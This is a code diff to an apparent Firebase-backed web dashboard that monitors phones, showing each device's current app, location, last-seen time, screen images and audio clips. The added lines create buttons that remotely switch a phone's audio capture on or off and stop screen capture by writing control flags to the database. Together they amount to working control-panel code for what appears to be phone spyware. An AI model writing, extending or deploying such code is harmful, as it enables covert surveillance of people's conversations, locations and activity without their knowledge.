@@ -42,7 +42,7 @@
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+    import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
     import { getAuth, signInWithEmailAndPassword, signOut, onAuthStateChanged }
       from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
 
@@ -122,9 +122,22 @@
             <div class="row"><span>📱 Current app</span><span>${live.currentApp ?? '-'}</span></div>
             <div class="row"><span>📍 Location</span><span>${map}</span></div>
             <div class="row"><span>🕒 Last seen</span><span>${timeAgo(d.lastSeen)}</span></div>
+            <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap">
+              <button class="ctl" data-id="${id}" data-act="audio-on" style="width:auto;padding:6px 10px;background:#238636;font-size:12px">🎤 Start audio</button>
+              <button class="ctl" data-id="${id}" data-act="audio-off" style="width:auto;padding:6px 10px;background:#8957e5;font-size:12px">🔇 Stop audio</button>
+              <button class="ctl" data-id="${id}" data-act="screen-off" style="width:auto;padding:6px 10px;background:#da3633;font-size:12px">🛑 Stop screen</button>
+            </div>
             ${img}
           </div>`;
         }).join("");
+
+        // Control buttons -> write to Firebase, phone reacts
+        document.querySelectorAll(".ctl").forEach(b => b.onclick = () => {
+          const id = b.dataset.id, act = b.dataset.act;
+          if (act === "audio-on")  set(ref(db, `devices/${id}/control/audio`), true);
+          if (act === "audio-off") set(ref(db, `devices/${id}/control/audio`), false);
+          if (act === "screen-off") set(ref(db, `devices/${id}/control/screen`), false);
+        });
 
         // Play new audio clips (~4s each)
         if (audioOn) {
